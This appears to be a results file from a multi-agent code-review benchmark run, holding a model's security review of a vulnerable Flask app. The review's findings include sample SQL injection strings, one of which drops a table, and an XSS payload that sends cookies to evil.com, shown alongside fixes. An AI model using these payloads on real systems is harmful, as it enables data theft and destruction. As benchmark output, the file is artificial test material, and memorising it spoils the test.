@@ -1,0 +1,107 @@
+{
+  "experiment_id": "b8dc46f6",
+  "pattern": "bdi",
+  "benchmark": "code_review",
+  "model": "claude-opus-4-6",
+  "num_agents": 3,
+  "num_rounds": 3,
+  "total_tokens": 7347,
+  "wall_time_seconds": 52.79605293273926,
+  "quality_score": 85.0,
+  "token_efficiency": 11.569348033210833,
+  "final_output": "\n\n# Code Review Report \u2014 Flask User Management Application\n\n---\n\n## \ud83d\udd34 CRITICAL Severity\n\n### 1. SQL Injection \u2014 Multiple Endpoints\n**Locations**: `get_user()`, `create_user()`, `search()`\n\n**Description**: All three endpoints construct SQL queries using Python f-strings with unsanitized user input. This is the textbook definition of SQL injection. An attacker can read, modify, or delete the entire database.\n\n**Exploit examples**:\n- `GET /users/1 OR 1=1` \u2014 dumps all users\n- `POST /users` with `name` = `'; DROP TABLE users; --` \u2014 destroys the table\n- `GET /search?q=' UNION SELECT sql,2,3 FROM sqlite_master--` \u2014 extracts schema\n\n**Fix**: Use parameterized queries exclusively.\n\n```python\n# get_user\ncursor = db.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,))\n\n# create_user\ndb.execute(\n    \"INSERT INTO users (name, email, password) VALUES (?, ?, ?)\",\n    (data['name'], data['email'], hashed_password)\n)\n\n# search\nresults = db.execute(\n    \"SELECT * FROM users WHERE name LIKE ?\",\n    (f\"%{query}%\",)\n).fetchall()\n```\n\n---\n\n### 2. Plaintext Password Storage\n**Location**: `create_user()`\n\n**Description**: User passwords are stored directly in the database without hashing. A database compromise immediately exposes every credential.\n\n**Fix**: Use `werkzeug.security`.\n\n```python\nfrom werkzeug.security import generate_password_hash\n\nhashed_password = generate_password_hash(data['password'])\ndb.execute(\n    \"INSERT INTO users (name, email, password) VALUES (?, ?, ?)\",\n    (data['name'], data['email'], hashed_password)\n)\n```\n\n---\n\n### 3. Unauthenticated Destructive Admin Endpoint\n**Location**: `delete_all()`\n\n**Description**: `POST /admin/delete_all` deletes every user and requires **zero authentication**. Anyone who can reach the server can wipe all data.\n\n**Fix**: Add authentication and authorization.\n\n```python\nfrom functools import wraps\n\ndef require_admin(f):\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        token = request.headers.get('Authorization')\n        if not verify_admin_token(token):\n            return jsonify({\"error\": \"Unauthorized\"}), 403\n        return f(*args, **kwargs)\n    return decorated\n\n@app.route(\"/admin/delete_all\", methods=[\"POST\"])\n@require_admin\ndef delete_all():\n    ...\n```\n\n---\n\n## \ud83d\udfe0 HIGH Severity\n\n### 4. Cross-Site Scripting (XSS)\n**Location**: `search()`\n\n**Description**: The search endpoint returns raw HTML with unescaped database values. An attacker can store a malicious name like `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` and it executes in every visitor's browser.\n\n**Fix**: Return JSON or escape output.\n\n```python\nfrom markupsafe import escape\n\n# Option A: Return JSON (preferred for APIs)\nreturn jsonify([{\"name\": r[1], \"email\": r[2]} for r in results])\n\n# Option B: Escape HTML\nreturn \"<html><body>\" + \"\".join(\n    f\"<p>{escape(r[1])}: {escape(r[2])}</p>\" for r in results\n) + \"</body></html>\"\n```\n\n---\n\n### 5. Database Connection Leaks\n**Location**: `get_db()` and all route handlers\n\n**Description**: Every request creates a new connection that is **never closed**, eventually exhausting file descriptors and crashing the application.\n\n**Fix**: Use Flask's `g` object and teardown hooks.\n\n```python\nfrom flask import g\n\ndef get_db():\n    if 'db' not in g:\n        g.db = sqlite3.connect(os.environ.get(\"DB_PATH\", \"app.db\"))\n        g.db.row_factory = sqlite3.Row\n    return g.db\n\n@app.teardown_appcontext\ndef close_db(exception):\n    db = g.pop('db', None)\n    if db is not None:\n        db.close()\n```\n\n---\n\n### 6. Remote Code Execution via Debug Mode\n**Location**: `app.run(debug=True, host=\"0.0.0.0\")`\n\n**Description**: `debug=True` enables the Werkzeug interactive debugger, which allows **arbitrary code execution** from a browser. Combined with `host=\"0.0.0.0\"`, this is accessible from any network.\n\n**Fix**:\n```python\nif __name__ == \"__main__\":\n    app.run(\n        debug=os.environ.get(\"FLASK_DEBUG\", \"false\").lower() == \"true\",\n        host=os.environ.get(\"FLASK_HOST\", \"127.0.0.1\")\n    )\n```\n\n---\n\n## \ud83d\udfe1 MEDIUM Severity\n\n### 7. No Input Validation\n**Location**: `create_user()`\n\n**Description**: Missing keys in the JSON body cause unhandled `KeyError` exceptions, returning raw 500 errors to clients.\n\n**Fix**:\n```python\n@app.route(\"/users\", methods=[\"POST\"])\ndef create_user():\n    data = request.get_json()\n    if not data or not all(k in data for k in (\"name\", \"email\", \"password\")):\n        return jsonify({\"error\": \"Missing required fields\"}), 400\n    ...\n```\n\n### 8. No Error Handling Around Database Operations\nWrap database calls in try/except blocks and return meaningful error responses instead of exposing stack traces.\n\n---\n\n## \ud83d\udd35 LOW Severity\n\n### 9. Information Disclosure in Search\nUser emails are exposed in the HTML search results to any unauthenticated user.\n\n### 10. No Application Factory Pattern\nThe app uses a global `Flask` instance rather than the factory pattern, making testing and configuration harder.\n\n---\n\n## Summary\n\n| # | Finding | Severity | Category |\n|---|---------|----------|----------|\n| 1 | SQL Injection (3 endpoints) | \ud83d\udd34 Critical | Security |\n| 2 | Plaintext password storage | \ud83d\udd34 Critical | Security |\n| 3 | Unauth'd destructive endpoint | \ud83d\udd34 Critical | Security |\n| 4 | Cross-Site Scripting (XSS) | \ud83d\udfe0 High | Security |\n| 5 | Database connection leaks | \ud83d\udfe0 High | Reliability |\n| 6 | Remote debug mode exposed | \ud83d\udfe0 High | Security |\n| 7 | No input validation | \ud83d\udfe1 Medium | Robustness |\n| 8 | No error handling | \ud83d\udfe1 Medium | Robustness |\n| 9 | Email information disclosure | \ud83d\udd35 Low | Privacy |\n| 10 | No app factory pattern | \ud83d\udd35 Low | Best Practice |\n\n> **Verdict**: This code is **not safe for any deployment**. The three critical SQL injection vectors alone make it trivially exploitable. All critical and high findings should be remediated before the application handles any real data.",
+  "agent_stats": {
+    "planner": {
+      "role": "coordinator",
+      "tokens_in": 3539,
+      "tokens_out": 3808,
+      "messages_sent": 4,
+      "messages_received": 0
+    },
+    "executor_a": {
+      "role": "specialist",
+      "tokens_in": 0,
+      "tokens_out": 0,
+      "messages_sent": 0,
+      "messages_received": 0
+    },
+    "executor_b": {
+      "role": "specialist",
+      "tokens_in": 0,
+      "tokens_out": 0,
+      "messages_sent": 0,
+      "messages_received": 0
+    }
+  },
+  "metadata": {
+    "bdi_cycles": 3,
+    "total_intentions": 0,
+    "llm_stats": {
+      "model": "claude-opus-4-6",
+      "total_calls": 2,
+      "total_tokens_in": 3539,
+      "total_tokens_out": 3808,
+      "total_tokens": 7347,
+      "total_latency_ms": 52794.015884399414,
+      "avg_latency_ms": 26397.007942199707
+    }
+  },
+  "messages": [
+    {
+      "sender": "system",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated beliefs",
+      "token_count": 0
+    },
+    {
+      "sender": "system",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated desires",
+      "token_count": 0
+    },
+    {
+      "sender": "system",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated intentions",
+      "token_count": 0
+    },
+    {
+      "sender": "system",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated outputs",
+      "token_count": 0
+    },
+    {
+      "sender": "planner",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated beliefs",
+      "token_count": 0
+    },
+    {
+      "sender": "planner",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated intentions",
+      "token_count": 0
+    },
+    {
+      "sender": "planner",
+      "receiver": "__broadcast__",
+      "performative": "inform",
+      "content": "\n\n```json\n{\n  \"beliefs\": [\n    \"Task received: Review the following Python Flask application code for bugs, security vulnerabilities, performance issues, and best practice violations.\",\n    \"The code is a Python Flask web application with SQLite database access.\",\n    \"CRITICAL: SQL Injection vulnerabilities exist in get_user(), create_user(), and search() \u2014 all use f-string interpolation directly into SQL queries.\",\n    \"CRITICAL: Stored passwords are in plaintext \u2014 no hashing is applied in cre",
+      "token_count": 0
+    },
+    {
+      "sender": "planner",
+      "receiver": "__blackboard__",
+      "performative": "inform",
+      "content": "Updated outputs",
+      "token_count": 0
+    }
+  ]
+}
